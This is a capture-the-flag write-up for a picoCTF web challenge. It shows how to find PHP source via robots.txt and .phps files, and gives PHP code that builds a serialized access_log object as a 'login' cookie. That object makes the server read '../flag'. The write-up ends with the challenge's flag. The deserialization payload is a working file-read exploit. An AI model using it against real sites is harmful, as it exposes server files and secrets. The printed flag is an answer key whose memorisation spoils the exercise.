It's a login page, but not important.
visit /robots.txt, there's a disallowed page "admin.phps".
Seems it supports the type .phps. But admin.phps is not found.
Try index.phps and we success, it's the source code.
After understanding, the "cookie.phps" shows how the cookie used in this website.
It unserialized base64 decoded cookie "login".
And it'll print the string if catch error.
Then back to authentication.phps, it shows "access_log" will get the content of the file.
So we can combine them to get our flag.
Firstly, use the "access_log"'s logic.
And then, set the $log_file of access_log to ../flag(Hint)
and serialize it and base64 encode, send it to cookie, so it will be executed.
Code:
<?php
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}
$s=new access_log("../flag");
echo base64_encode(serialize($s));
?>
Run it on php compiler and we get the payload cookie.
Send it to the website by name "login" to get the flag.
The flag will be printed to authentication.php due to our setting.
picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}